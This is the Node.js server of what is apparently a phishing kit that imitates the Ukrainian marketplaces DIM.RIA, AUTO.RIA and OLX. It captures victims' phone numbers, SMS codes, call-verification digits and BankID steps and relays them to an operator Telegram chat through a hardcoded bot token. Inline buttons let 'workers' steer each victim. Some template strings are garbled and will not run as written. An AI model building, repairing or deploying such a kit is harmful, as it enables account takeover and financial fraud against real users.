const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = "8311394660:AAEt9CJLYspkbVUcopIYik2KFh1EXLgIko8";
const CHAT_ID = "-1003298945563";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

app.use(bodyParser.json());
app.use(express.static(__dirname));

const LOGOS = { /* без изменений */ };
const PROJECT_NAMES = { /* без изменений */ };

// Главная страница
app.get('/', (req, res) => {
    const project = req.query.project || 'dimria';
    if (!['dimria', 'autoria', 'ria', 'olx'].includes(project)) {
        return res.status(400).send('Невідомий проект');
    }
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/logo', (req, res) => {
    const project = req.query.project || 'dimria';
    const logo = LOGOS[project] || LOGOS.dimria;
    res.redirect(logo);
});

// Отправка данных + кнопки
app.post('/api/send-data', async (req, res) => {
    const { step, phone, code, call_code, sms_code, worker, project = 'dimria', city = 'Невідомо' } = req.body;
    const projectName = PROJECT_NAMES[project] || 'DIM.RIA';

    let text = '';
    let keyboard = null;

    if (step === 'phone' && phone) {
        text = `*ПРОЕКТ:* \( {projectName} ⚡\n*Номер:* \` \){phone}\`\n*Місто:* ${city}`;
        if (worker) text += `\n*Воркер:* @${worker}`;

        const currentUrl = `https://\( {req.headers.host} \){req.headers.referer?.split('?')[0] || '/'}`;
        const baseUrl = currentUrl + (currentUrl.endsWith('/') ? '' : '/') + `?project=${project}`;
        if (worker) baseUrl += `&ref=${req.query.ref || ''}`;

        keyboard = {
            inline_keyboard: [[
                { text: "Звонок", callback_data: `call|\( {phone}| \){project}|${worker || ''}` },
                { text: "Код", callback_data: `sms|\( {phone}| \){project}|${worker || ''}` },
                { text: "BankID", callback_data: `bankid|\( {phone}| \){project}|${worker || ''}` }
            ]]
        };
    } 
    else if (step === 'call_code') {
        text = ` Последние 4 цифры от звонка:\n\`\( {call_code}\`\nНомер: \` \){phone}\`\nПроект: ${projectName}`;
    }
    else if (step === 'sms_code') {
        text = ` SMS-КОД:\n\`\( {sms_code}\`\nНомер: \` \){phone}\`\nПроект: ${projectName}`;
    }

    if (text) {
        const payload = {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown',
            reply_markup: keyboard
        };

        await fetch(TELEGRAM_API + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }

    res.json({ success: true });
});

// Обработка нажатий на кнопки
app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
    if (req.body.callback_query) {
        const cb = ${(req.body.callback_query.data)};
        const [action, phone, project, worker] = cb.split('|');

        let url = `/?project=${project}`;
        if (worker) url += `&ref=${btoa(worker)}`;
        if (action === 'call') url += '&action=call';
        if (action === 'sms') url += '&action=sms';
        if (action === 'bankid') url += '&action=bankid';

        const editPayload = {
            chat_id: req.body.callback_query.message.chat.id,
            message_id: req.body.callback_query.message.message_id,
            text: req.body.callback_query.message.text + `\n\n Перехід: ${action === 'call' ? 'Звонок' : action === 'sms' ? 'SMS-код' : 'BankID'}`,
            parse_mode: 'Markdown'
        };

        await fetch(TELEGRAM_API + '/editMessageText', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(editPayload)
        });

        await fetch(TELEGRAM_API + '/answerCallbackQuery', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                callback_query_id: req.body.callback_query.id,
                text: "Відкриваю форму...",
                show_alert: false
            })
        });

        // Отправляем жертве ссылку через redirect (она откроется в браузере)
        const victimUrl = `https://\( {req.headers.host} \){url}`;
        // можно ещё отправить ссылку в чат, если хочешь:
        fetch(TELEGRAM_API + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: ` Відкрита форма: ${victimUrl}`,
                disable_web_page_preview: true
            })
        });
    }
    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});
